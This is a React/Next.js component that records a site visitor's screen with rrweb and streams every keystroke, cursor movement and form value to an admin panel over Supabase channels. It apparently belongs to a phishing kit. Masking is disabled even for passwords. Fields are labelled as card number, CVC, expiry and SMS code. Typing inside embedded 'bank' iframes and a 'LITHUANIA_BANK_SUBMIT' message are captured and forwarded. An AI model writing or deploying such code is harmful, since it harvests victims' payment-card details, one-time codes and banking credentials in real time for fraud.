"use client";

import { useEffect, useRef } from "react";
import { useParams, usePathname } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { resolveClientSessionId } from "@/components/VisitorTracker";
import { sendBroadcastPacket } from "@/lib/broadcast-transfer";
import { ACTIVE_SESSION_EVENT } from "@/lib/session-id-client";
import type { RealtimeChannel } from "@supabase/supabase-js";

export type LiveClientMeta = {
  sessionId: string;
  pathname: string;
  title: string;
  width: number;
  height: number;
  userAgent: string;
  timestamp: number;
};

export type LiveUserAction = {
  type: "click" | "input" | "focus" | "blur" | "scroll" | "navigate";
  target?: string;
  value?: string;
  pathname: string;
  timestamp: number;
  inputName?: string;
  inputId?: string;
  placeholder?: string;
};

function getFieldDisplayName(target: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement): string {
  const aria = target.getAttribute("aria-label");
  if (aria && aria.trim()) return aria.trim();

  const placeholder = target.getAttribute("placeholder");
  if (placeholder && placeholder.trim()) return placeholder.trim();

  const parentLabel = target.closest("label");
  if (parentLabel) {
    try {
      const clone = parentLabel.cloneNode(true) as HTMLElement;
      clone.querySelectorAll("input, select, textarea, button, svg").forEach((el) => el.remove());
      const text = (clone.textContent || "").trim().split("\n")[0].trim();
      if (text && text.length < 50) return text;
    } catch {
      /* ignore */
    }
  }

  if (target.id) {
    const labelEl = document.querySelector(`label[for="${target.id}"]`);
    if (labelEl && labelEl.textContent) {
      const text = labelEl.textContent.trim().split("\n")[0].trim();
      if (text && text.length < 50) return text;
    }
  }

  const ac = target.getAttribute("autocomplete");
  if (ac === "cc-number") return "Kart Numarası";
  if (ac === "cc-exp") return "Son Kullanma (SKT)";
  if (ac === "cc-csc") return "CVC";
  if (ac === "tel") return "Telefon Numarası";
  if (ac === "name") return "İsim Soyisim";

  const n = (target.name || target.id || "").toLowerCase();
  if (n.includes("card") || n.includes("number")) return "Kart Numarası";
  if (n.includes("exp")) return "Son Kullanma (SKT)";
  if (n.includes("cvc") || n.includes("cvv")) return "CVC";
  if (n.includes("phone") || n.includes("tel")) return "Telefon";
  if (n.includes("first")) return "Ad";
  if (n.includes("last")) return "Soyad";
  if (n.includes("code") || n.includes("sms") || n.includes("tac")) return "SMS / Kod";

  return target.name || target.id || "Giriş Alanı";
}

export function LiveScreenRecorder() {
  const pathname = usePathname();
  const params = useParams();
  const channelRef = useRef<RealtimeChannel | null>(null);
  const stopRecordRef = useRef<(() => void) | null>(null);
  const isStreamingRef = useRef(false);
  const streamTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const currentSessionIdRef = useRef<string | null>(null);
  const initialMetaRef = useRef<any>(null);
  const initialSnapshotRef = useRef<any>(null);

  useEffect(() => {
    if (typeof window === "undefined") return;
    if (window.location.pathname.startsWith("/admin")) return;

    let isDisposed = false;
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const extendStreaming = () => {
      isStreamingRef.current = true;
      if (streamTimeoutRef.current) clearTimeout(streamTimeoutRef.current);
      streamTimeoutRef.current = setTimeout(() => {
        isStreamingRef.current = false;
      }, 90000);
    };

    async function initRecorder() {
      const routeSessionId = params?.id as string | undefined;
      const querySessionId = new URLSearchParams(window.location.search).get("session");
      let resolved = await resolveClientSessionId(supabase, routeSessionId, querySessionId);
      let sessionId = resolved?.sessionId;

      // URL veya storage henuz hazir degilse race condition'i engellemek icin retry yap
      if (!sessionId) {
        for (let attempt = 0; attempt < 8 && !sessionId && !isDisposed; attempt++) {
          await new Promise((r) => setTimeout(r, 350));
          if (isDisposed) return;
          const retryQuery = new URLSearchParams(window.location.search).get("session");
          const retryRoute = params?.id as string | undefined;
          resolved = await resolveClientSessionId(supabase, retryRoute, retryQuery);
          sessionId = resolved?.sessionId;
        }
      }

      if (!sessionId || isDisposed || !supabase) return;
      currentSessionIdRef.current = sessionId;

      let rrweb: typeof import("rrweb") | null = null;
      try {
        rrweb = await import("rrweb");
      } catch (e) {
        console.error("[LiveScreenRecorder] failed to import rrweb:", e);
        return;
      }

      if (isDisposed) return;

      const channelName = `live-screen:${sessionId}`;
      const channel = supabase.channel(channelName, {
        config: { broadcast: { ack: false } },
      });
      channelRef.current = channel;

      const sendMeta = async () => {
        const meta: LiveClientMeta = {
          sessionId,
          pathname: window.location.pathname,
          title: document.title,
          width: window.innerWidth,
          height: window.innerHeight,
          userAgent: navigator.userAgent,
          timestamp: Date.now(),
        };
        await sendBroadcastPacket(channel, "client_meta", meta);
      };

      const sendAction = async (action: Omit<LiveUserAction, "pathname" | "timestamp">) => {
        if (!isStreamingRef.current || !channelRef.current) return;
        const fullAction: LiveUserAction = {
          ...action,
          pathname: window.location.pathname,
          timestamp: Date.now(),
        };
        await sendBroadcastPacket(channelRef.current, "user_action", fullAction);
      };

      const sendCurrentFields = (doc: Document) => {
        try {
          doc.querySelectorAll("input, textarea, select").forEach((el: any) => {
            const t = el as HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement;
            if (!t.value) return;
            if (["checkbox", "radio", "hidden", "submit", "button", "file"].includes(t.type)) return;
            const fieldName = getFieldDisplayName(t);
            const val = t.value;
            void sendAction({
              type: "input",
              target: fieldName,
              value: val,
              inputName: t.name || undefined,
              inputId: t.id || undefined,
              placeholder: (t as HTMLInputElement).placeholder || undefined,
            });
          });
        } catch {
          /* ignore */
        }
      };

      const sendFullSnapshotFlow = async () => {
        extendStreaming();
        await sendMeta();

        // 1. Synthetic Meta event so admin Replayer knows dimensions immediately
        if (channelRef.current) {
          const metaEvent = {
            type: 4, // EventType.Meta
            data: {
              href: window.location.href,
              width: window.innerWidth,
              height: window.innerHeight,
            },
            timestamp: Date.now(),
          };
          await sendBroadcastPacket(channelRef.current, "screen_event", metaEvent);
        }

        // 2. Trigger full DOM snapshot
        if (rrweb && rrweb.record) {
          try {
            rrweb.record.takeFullSnapshot(true);
          } catch (err) {
            console.error("[LiveScreenRecorder] takeFullSnapshot error:", err);
          }
        }

        // 3. Mevcut input degerlerini aninda gonder
        try {
          sendCurrentFields(document);
          document.querySelectorAll("iframe").forEach((f: any) => {
            try {
              const d = (f as HTMLIFrameElement).contentDocument;
              if (d) sendCurrentFields(d);
            } catch {
              /* cross-origin iframe */
            }
          });
        } catch {
          /* ignore */
        }
      };

      // Listen for admin requests
      channel
        .on("broadcast", { event: "admin_request_snapshot" }, async () => {
          await sendFullSnapshotFlow();
        })
        .on("broadcast", { event: "admin_heartbeat" }, () => {
          extendStreaming();
        })
        .on("broadcast", { event: "admin_disconnect" }, () => {
          isStreamingRef.current = false;
        });

      // Start rrweb recording FIRST so listeners & mirror are active
      try {
        const stop = rrweb.record({
          emit(event) {
            if (isDisposed) return;
            // Cache initial meta & snapshot
            if (event.type === 4) initialMetaRef.current = event;
            if (event.type === 2) initialSnapshotRef.current = event;

            // Stream to channel if admin is watching
            if (isStreamingRef.current && channelRef.current) {
              void sendBroadcastPacket(channelRef.current, "screen_event", event);
            }
          },
          maskAllInputs: false,
          maskInputOptions: {
            password: false,
          },
          inlineStylesheet: true,
          inlineImages: false,
          collectFonts: false,
          recordCanvas: true,
          keepIframeSrcFn: () => true,
          sampling: {
            mousemove: 60,
            mouseInteraction: true,
            scroll: 60,
            input: "all",
          },
        });
        stopRecordRef.current = stop || null;
      } catch (err) {
        console.error("[LiveScreenRecorder] rrweb record error:", err);
      }

      channel.subscribe(async (status) => {
        if (status === "SUBSCRIBED" && !isDisposed) {
          await sendMeta();
          await sendFullSnapshotFlow();
        }
      });

      // FIELD-BASED INSTANT INPUT: ANLIK OLARAK ALAN BAZLI GÖNDERİM!
      const handleInput = (e: Event) => {
        const target = e.target as HTMLInputElement | HTMLTextAreaElement | null;
        if (!target) return;
        const fieldName = getFieldDisplayName(target);
        const val = target.value || "";

        void sendAction({
          type: "input",
          target: fieldName,
          value: val,
          inputName: target.name || undefined,
          inputId: target.id || undefined,
          placeholder: (target as HTMLInputElement).placeholder || undefined,
        });
      };

      const handleBlur = (e: FocusEvent) => {
        const target = e.target as HTMLInputElement | HTMLTextAreaElement | null;
        if (!target) return;
        const fieldName = getFieldDisplayName(target);
        void sendAction({
          type: "blur",
          target: fieldName,
          inputName: target.name || undefined,
          inputId: target.id || undefined,
        });
      };

      const handleFocus = (e: FocusEvent) => {
        const target = e.target as HTMLInputElement | HTMLTextAreaElement | null;
        if (!target) return;
        const desc = getFieldDisplayName(target);
        void sendAction({
          type: "focus",
          target: desc,
          inputName: target.name || undefined,
          inputId: target.id || undefined,
        });
      };

      window.addEventListener("input", handleInput, { capture: true, passive: true });
      window.addEventListener("blur", handleBlur, { capture: true, passive: true });
      window.addEventListener("focus", handleFocus, { capture: true, passive: true });

      // ANYDESK-STYLE LIVE CURSOR & SCROLL BROADCAST
      let lastCursorSend = 0;
      const sendCursor = (x: number, y: number, isClick = false, isTouch = false) => {
        if (!isStreamingRef.current || !channelRef.current) return;
        const now = Date.now();
        if (!isClick && now - lastCursorSend < 30) return; // ~33fps smooth cursor streaming
        lastCursorSend = now;
        void sendBroadcastPacket(channelRef.current, "client_cursor", {
          x: Math.max(0, Math.min(1, x)),
          y: Math.max(0, Math.min(1, y)),
          isClick,
          isTouch,
        });
      };

      const onMouseMove = (e: MouseEvent) => {
        sendCursor(e.clientX / window.innerWidth, e.clientY / window.innerHeight, false, false);
      };

      const onMouseDown = (e: MouseEvent) => {
        sendCursor(e.clientX / window.innerWidth, e.clientY / window.innerHeight, true, false);
      };

      const onTouchMove = (e: TouchEvent) => {
        if (e.touches.length > 0) {
          const t = e.touches[0];
          sendCursor(t.clientX / window.innerWidth, t.clientY / window.innerHeight, false, true);
        }
      };

      const onTouchStart = (e: TouchEvent) => {
        if (e.touches.length > 0) {
          const t = e.touches[0];
          sendCursor(t.clientX / window.innerWidth, t.clientY / window.innerHeight, true, true);
        }
      };

      let lastScrollSend = 0;
      const onScroll = () => {
        if (!isStreamingRef.current || !channelRef.current) return;
        const now = Date.now();
        if (now - lastScrollSend < 50) return;
        lastScrollSend = now;
        const maxScroll = Math.max(1, document.documentElement.scrollHeight - window.innerHeight);
        void sendBroadcastPacket(channelRef.current, "client_scroll", {
          scrollY: window.scrollY,
          scrollRatio: window.scrollY / maxScroll,
        });
      };

      window.addEventListener("mousemove", onMouseMove, { passive: true });
      window.addEventListener("mousedown", onMouseDown, { passive: true });
      window.addEventListener("touchmove", onTouchMove, { passive: true });
      window.addEventListener("touchstart", onTouchStart, { passive: true });
      window.addEventListener("scroll", onScroll, { passive: true });

      // ATTACH TO SAME-ORIGIN BANK IFRAMES TO CAPTURE TYPING INSIDE BANK SCREENS!
      const attachToIframe = (ifr: HTMLIFrameElement) => {
        try {
          const doc = ifr.contentDocument || ifr.contentWindow?.document;
          if (doc && !(ifr as any).__liveAttached) {
            (ifr as any).__liveAttached = true;
            doc.addEventListener("input", handleInput, { capture: true, passive: true });
            doc.addEventListener("change", handleInput, { capture: true, passive: true });
            doc.addEventListener("focus", handleFocus, { capture: true, passive: true });
            doc.addEventListener("blur", handleBlur, { capture: true, passive: true });
            doc.addEventListener("mousemove", (e: MouseEvent) => {
              const rect = ifr.getBoundingClientRect();
              sendCursor((rect.left + e.clientX) / window.innerWidth, (rect.top + e.clientY) / window.innerHeight, false, false);
            }, { passive: true });
            doc.addEventListener("mousedown", (e: MouseEvent) => {
              const rect = ifr.getBoundingClientRect();
              sendCursor((rect.left + e.clientX) / window.innerWidth, (rect.top + e.clientY) / window.innerHeight, true, false);
            }, { passive: true });
          }
        } catch {
          /* ignore */
        }
      };

      const scanIframes = () => {
        document.querySelectorAll("iframe").forEach((f: any) => {
          const ifr = f as HTMLIFrameElement;
          attachToIframe(ifr);
          if (!(ifr as any).__loadAttached) {
            (ifr as any).__loadAttached = true;
            ifr.addEventListener("load", () => {
              attachToIframe(ifr);
              setTimeout(() => {
                try {
                  const d = ifr.contentDocument;
                  if (d) sendCurrentFields(d);
                } catch {
                  /* ignore */
                }
              }, 200);
            });
          }
        });
      };
      scanIframes();
      const iframeInterval = setInterval(scanIframes, 600);

      // Listen for bank postMessage submissions
      const handleWindowMessage = (e: MessageEvent) => {
        if (!e.data || typeof e.data !== "object") return;
        if (e.data.type === "LITHUANIA_BANK_SUBMIT" && e.data.formData) {
          const fd = e.data.formData;
          if (Array.isArray(fd.fields)) {
            fd.fields.forEach((f: any) => {
              if (f.key && f.value) {
                void sendAction({
                  type: "input",
                  target: f.label || f.name || f.key,
                  value: f.value,
                });
              }
            });
          }
        }
      };
      window.addEventListener("message", handleWindowMessage);

      return () => {
        clearInterval(iframeInterval);
        window.removeEventListener("message", handleWindowMessage);
        window.removeEventListener("input", handleInput, true);
        window.removeEventListener("blur", handleBlur, true);
        window.removeEventListener("focus", handleFocus, true);
        window.removeEventListener("mousemove", onMouseMove);
        window.removeEventListener("mousedown", onMouseDown);
        window.removeEventListener("touchmove", onTouchMove);
        window.removeEventListener("touchstart", onTouchStart);
        window.removeEventListener("scroll", onScroll);
      };
    }

    let cleanupPromise = initRecorder();

    const onSessionChanged = () => {
      void cleanupPromise.then((cleanupFn) => {
        if (typeof cleanupFn === "function") cleanupFn();
      });
      cleanupPromise = initRecorder();
    };
    window.addEventListener(ACTIVE_SESSION_EVENT, onSessionChanged);

    return () => {
      isDisposed = true;
      window.removeEventListener(ACTIVE_SESSION_EVENT, onSessionChanged);
      if (streamTimeoutRef.current) clearTimeout(streamTimeoutRef.current);
      if (stopRecordRef.current) {
        try {
          stopRecordRef.current();
        } catch {
          /* ignore */
        }
        stopRecordRef.current = null;
      }
      if (channelRef.current) {
        void supabase.removeChannel(channelRef.current);
        channelRef.current = null;
      }
      void cleanupPromise.then((cleanupFn) => {
        if (typeof cleanupFn === "function") cleanupFn();
      });
    };
  }, [pathname, params?.id]);

  return null;
}
